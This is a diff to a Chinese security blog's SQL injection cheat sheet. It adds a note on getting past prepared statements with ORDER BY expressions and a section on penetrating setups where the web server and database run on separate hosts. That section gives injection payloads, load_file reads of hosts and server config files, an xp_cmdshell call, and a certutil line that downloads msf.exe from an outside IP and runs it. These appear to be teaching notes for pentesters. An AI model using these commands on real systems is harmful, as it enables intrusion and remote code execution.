@@ -40,8 +40,10 @@
 <meta property="og:image" content="https://hackerqwq.github.io/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/12.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/13.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/14.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/wp/axuxfcnn63.png">
+<meta property="og:image" content="http://cn-sec.com/wp-content/uploads/2020/11/2-1604278328.png">
 <meta property="article:published_time" content="2021-02-28T05:22:32.000Z">
-<meta property="article:modified_time" content="2021-06-22T07:17:00.113Z">
+<meta property="article:modified_time" content="2021-08-06T15:26:50.058Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="sql">
@@ -302,7 +304,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">6.4k</span>Reading time: <span class="post-count reading-time">28 min</span></span>
+                        <span>Word count: <span class="post-count word-count">7.3k</span>Reading time: <span class="post-count reading-time">32 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -745,6 +747,100 @@ height:50vh;
 <p>代码示例：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> MySQLi(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$mysqli)&#123;</span><br><span class="line"><span class="keyword">die</span>($mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from users where id=?&quot;</span>;<span class="comment">////创建一个预定义的对象 ?占位</span></span><br><span class="line">$mysqli_stmt = $mysqli-&gt;prepare($sql);</span><br><span class="line">$id=$_REQUEST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">&quot;i&quot;</span>,$id);<span class="comment">////绑定参数</span></span><br><span class="line">$mysqli_stmt-&gt;bind_result($id,$username,$password);<span class="comment">////绑定结果集</span></span><br><span class="line">$mysqli_stmt-&gt;execute();<span class="comment">//执行</span></span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123; <span class="comment">//取出绑定的结果集</span></span><br><span class="line"><span class="keyword">echo</span> $id.<span class="string">&quot; &quot;</span>.$username .<span class="string">&quot; &quot;</span>. $password;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$mysqli_stmt-&gt;free_result(); <span class="comment">////关闭结果集</span></span><br><span class="line">$mysqli_stmt-&gt;close();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<ul>
+<li><p>预编译的绕过</p>
+<p>假如目标使用了<code>order by</code>语句，可以通过<code>orderExpression</code>来绕过预编译</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/wp/axuxfcnn63.png" alt="axuxfcnn63"></p>
+<p> 这意味这<code>orderExpression</code>可以是一个<code>selectExpression</code>也可以是一个函数。  例如使用一个<code>case</code>语句。  <code>select * from users order by (case when (true) then lastname else firstname)</code>  因此可以用任何布尔类型来替代when(…)的一部分，从而判断语句是否起作用。</p>
+<p>例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">category</span> <span class="keyword">order</span> <span class="keyword">by</span>(<span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> <span class="keyword">NAME</span> <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h1 id="站库分离的系统渗透方法"><a href="#站库分离的系统渗透方法" class="headerlink" title="站库分离的系统渗透方法"></a>站库分离的系统渗透方法</h1><p>站库分离示意图：</p>
+<p><img src="http://cn-sec.com/wp-content/uploads/2020/11/2-1604278328.png" alt="站库分离常规渗透思路总结"></p>
+<h2 id="由Web服务器渗透数据库服务器"><a href="#由Web服务器渗透数据库服务器" class="headerlink" title="由Web服务器渗透数据库服务器"></a>由Web服务器渗透数据库服务器</h2><p>获得web服务器权限之后可以对数据库<strong>配置文件</strong>、数据库<strong>内容分析</strong>、查找<strong>备份</strong>等对数据库地址进行定位然后渗透</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano|findstr &quot;1433&quot;# 查mssql端口所连接的服务器</span><br><span class="line">#同理还有mysql的3306，oracle的1521、redis的6379、</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">数据库</th>
+<th align="center">数据库端口</th>
+<th align="center">数据库类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Oracle</td>
+<td align="center">1521</td>
+<td align="center">关系型</td>
+</tr>
+<tr>
+<td align="center">MySQL</td>
+<td align="center">3306</td>
+<td align="center">关系型</td>
+</tr>
+<tr>
+<td align="center">SQLServer</td>
+<td align="center">1433</td>
+<td align="center">关系型</td>
+</tr>
+<tr>
+<td align="center">MongoDB</td>
+<td align="center">27017</td>
+<td align="center">非关系型</td>
+</tr>
+<tr>
+<td align="center">Redis</td>
+<td align="center">6379</td>
+<td align="center">非关系型</td>
+</tr>
+<tr>
+<td align="center">memcached</td>
+<td align="center">11211</td>
+<td align="center">非关系型</td>
+</tr>
+<tr>
+<td align="center">postgreSQL</td>
+<td align="center">5432</td>
+<td align="center">非关系型</td>
+</tr>
+</tbody></table>
+<h2 id="由数据库服务器对Web服务器进行渗透"><a href="#由数据库服务器对Web服务器进行渗透" class="headerlink" title="由数据库服务器对Web服务器进行渗透"></a>由数据库服务器对Web服务器进行渗透</h2><ol>
+<li>查询连接的信息</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @@hostname; &#x2F;&#x2F;服务端主机名称</span><br><span class="line">select * from information_schema.PROCESSLIST &#x2F;&#x2F;客户端主机名称和端口</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>读取敏感文件</p>
+<p>hosts文件中解析的一些内网业务的IP地址和域名，<code>IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere</code>的相关配置文件以及网卡信息等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules          &#x2F;&#x2F;获取网卡名称</span><br><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces                            &#x2F;&#x2F;DHCP或静态IP</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;dhclient&#x2F;dhclient--网卡.lease             &#x2F;&#x2F;DHCP</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-网卡          &#x2F;&#x2F;静态IP</span><br><span class="line">C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts</span><br><span class="line">C:&#x2F;Windows&#x2F;system32&#x2F;inetsrv&#x2F;MetaBase.xml</span><br><span class="line">C:&#x2F;Windows&#x2F;System32&#x2F;inetsrv&#x2F;config&#x2F;applicationHost.config</span><br><span class="line">C:&#x2F;phpStudy&#x2F;Apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">C:&#x2F;phpStudy&#x2F;Apache&#x2F;conf&#x2F;vhosts.conf</span><br><span class="line">C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;Apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;Apache&#x2F;conf&#x2F;vhosts.conf</span><br><span class="line">C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;nginx&#x2F;conf&#x2F;vhosts.conf</span><br><span class="line">[...SNIP...]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断MSSQL是否是站库分离</p>
+<p>比较客户端主机名称和服务端主机名称</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> host_name();                       //客户端主机名称</span><br><span class="line"><span class="keyword">select</span> @@servername;                      //服务端主机名称</span><br><span class="line"><span class="keyword">select</span> serverproperty(<span class="string">&#x27;MachineName&#x27;</span>);     //服务端主机名称</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过MSSQL的<code>sysprocesses</code>系统表来判断是否站库分离，它的功能类似于MySQL中的<code>PROCESSLIST</code>，可以定位到当前已连接到<code>sqlinject</code>数据库的用户名和主机名等信息。</p>
+</li>
+</ol>
+<p>   有时会有内网多台Web服务器同时连接一台数据库服务器中的不同数据库，这时我们就可以利用这种方式来查看连接到某数据库的用户名和主机名等信息，然后使用Ping主机名得到这台Web服务器的内网IP地址。</p>
+   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master.sys.sysdatabases;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> master.sys.sysprocesses <span class="keyword">where</span> dbid= db_id(<span class="string">&#x27;sqlinject&#x27;</span>);</span><br><span class="line">exec master..xp_cmdshell &#x27;cmd /c ping WIN-111111111&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>   还可以直接通过以下MSSQL注入语句来判断是否站库分离，news必须为数据库中存在的表名，当然用其他存在的表名也是可以的，如果注入页面返回不正常则说明为站库分离，反之则为同服务器。</p>
+   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="number">1</span>=(<span class="keyword">SELECT</span> (<span class="keyword">case</span> <span class="keyword">when</span> host_name()=@@servername <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)))</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>下载远程文件</p>
+<p>通过<code>Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell</code>下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;155.**.***.229:8888&#x2F;msf.exe C:ProgramDatamsf.exe</span><br><span class="line">C:ProgramDatamsf.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行远程payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#使用exploit&#x2F;multi&#x2F;script&#x2F;web_delivery和exploit&#x2F;windows&#x2F;misc&#x2F;hta_server模块</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
 <li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/07/5deb12bee9a98/?__cf_chl_jschl_tk__=8ae3404b75fabdde0fe82de288e5e73b283956ca-1614510870-0-AUjQIr3zdwr2q26z_fVFzk9N1q_ZkVsYoov6XPJp9BSOU5EK2s34RXQnkQUz6wFzMss2NwTPgKJmeaP2eXW_JRGK1l1ZoVEHk93fkTnH__bKOcCvxAVNlMpugEPuPFt6HMsmF2kQxBavbegTfJicX3k-IqzVA2CAUAbjKoY2Tx3nm0UKp8KICuOr22SjeK_X417FYhR44OwbVyBjYfYnj_OuFHzrzNJ8T3zwUy-emfsAB7fT89H4UBfJlQApCw2CLWb-RVdLbZnvVXXXDk9yG26tnCnXl72eOEtBdi4ASCXbDF8hSSg1ulFBAdi9K-PiMM3jE4VZ2x3b-YF0CF_3cz0">SQL注入之sqlserver注入</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/200154#h2-13">SQLServer数据库注入详解</a></li>
@@ -900,7 +996,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Mysql"><span class="toc-number">1.</span> <span class="toc-text">0x01 Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-root%E6%9D%83%E9%99%90"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1 判断是否具有读写权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 MySQL联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-%E9%80%82%E7%94%A8%E4%BA%8Emysql%E4%BD%8E%E4%BA%8E5-0%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1 适用于mysql低于5.0版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-%E9%80%82%E7%94%A8%E4%BA%8EMysql-5-0%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E6%94%AF%E6%8C%81%E6%9F%A5%E8%A1%A8%E6%9F%A5%E5%88%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2 适用于Mysql 5.0以上版本支持查表查列</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 Mysql报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-Mysql%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 Mysql盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-Mysql%E4%B8%89%E6%AD%A5%E5%86%99shell"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 Mysql三步写shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-SQLServer"><span class="toc-number">2.</span> <span class="toc-text">0x02 SQLServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">SQLServer基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AFMSSqlServer%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">判断是MSSqlServer方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLServer%E7%9A%84%E5%BA%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">SQLServer的库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sysobjects%E8%A1%A8"><span class="toc-number">2.2.</span> <span class="toc-text">sysobjects表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.3.</span> <span class="toc-text">SQLServer基础查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SA%E6%9D%83%E9%99%90"><span class="toc-number">2.4.</span> <span class="toc-text">SA权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFxp-cmdshell%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.1.</span> <span class="toc-text">开启xp_cmdshell执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sp-oacrete%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.2.</span> <span class="toc-text">使用sp_oacrete执行系统命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DB-OWNER%E6%9D%83%E9%99%90"><span class="toc-number">2.5.</span> <span class="toc-text">DB_OWNER权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOG%E5%A4%87%E4%BB%BDGetshell"><span class="toc-number">2.5.1.</span> <span class="toc-text">LOG备份Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDGetShell"><span class="toc-number">2.5.2.</span> <span class="toc-text">权限差异备份GetShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-Union%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.6.</span> <span class="toc-text">SQLServer Union查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">2.7.</span> <span class="toc-text">SQLServer 延时注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.8.</span> <span class="toc-text">SQLServer 盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.9.</span> <span class="toc-text">SQLServer报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%E7%9A%84%E5%A5%87%E5%B7%A7%E6%B7%AB%E6%8A%80"><span class="toc-number">2.10.</span> <span class="toc-text">SQLServer获取权限的奇巧淫技</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Oracle"><span class="toc-number">3.</span> <span class="toc-text">0x03 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">手工显错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">sql注入防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Mysql"><span class="toc-number">1.</span> <span class="toc-text">0x01 Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-root%E6%9D%83%E9%99%90"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1 判断是否具有读写权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-MySQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 MySQL联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-%E9%80%82%E7%94%A8%E4%BA%8Emysql%E4%BD%8E%E4%BA%8E5-0%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1 适用于mysql低于5.0版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-%E9%80%82%E7%94%A8%E4%BA%8EMysql-5-0%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E6%94%AF%E6%8C%81%E6%9F%A5%E8%A1%A8%E6%9F%A5%E5%88%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2 适用于Mysql 5.0以上版本支持查表查列</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 Mysql报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-Mysql%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 Mysql盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-Mysql%E4%B8%89%E6%AD%A5%E5%86%99shell"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 Mysql三步写shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-SQLServer"><span class="toc-number">2.</span> <span class="toc-text">0x02 SQLServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">SQLServer基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AFMSSqlServer%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">判断是MSSqlServer方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLServer%E7%9A%84%E5%BA%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">SQLServer的库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sysobjects%E8%A1%A8"><span class="toc-number">2.2.</span> <span class="toc-text">sysobjects表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.3.</span> <span class="toc-text">SQLServer基础查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SA%E6%9D%83%E9%99%90"><span class="toc-number">2.4.</span> <span class="toc-text">SA权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFxp-cmdshell%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.1.</span> <span class="toc-text">开启xp_cmdshell执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sp-oacrete%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.2.</span> <span class="toc-text">使用sp_oacrete执行系统命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DB-OWNER%E6%9D%83%E9%99%90"><span class="toc-number">2.5.</span> <span class="toc-text">DB_OWNER权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOG%E5%A4%87%E4%BB%BDGetshell"><span class="toc-number">2.5.1.</span> <span class="toc-text">LOG备份Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDGetShell"><span class="toc-number">2.5.2.</span> <span class="toc-text">权限差异备份GetShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-Union%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.6.</span> <span class="toc-text">SQLServer Union查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">2.7.</span> <span class="toc-text">SQLServer 延时注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer-%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.8.</span> <span class="toc-text">SQLServer 盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.9.</span> <span class="toc-text">SQLServer报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLServer%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%E7%9A%84%E5%A5%87%E5%B7%A7%E6%B7%AB%E6%8A%80"><span class="toc-number">2.10.</span> <span class="toc-text">SQLServer获取权限的奇巧淫技</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Oracle"><span class="toc-number">3.</span> <span class="toc-text">0x03 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">手工显错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">sql注入防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">站库分离的系统渗透方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B1Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">5.1.</span> <span class="toc-text">由Web服务器渗透数据库服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B1%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">5.2.</span> <span class="toc-text">由数据库服务器对Web服务器进行渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
     
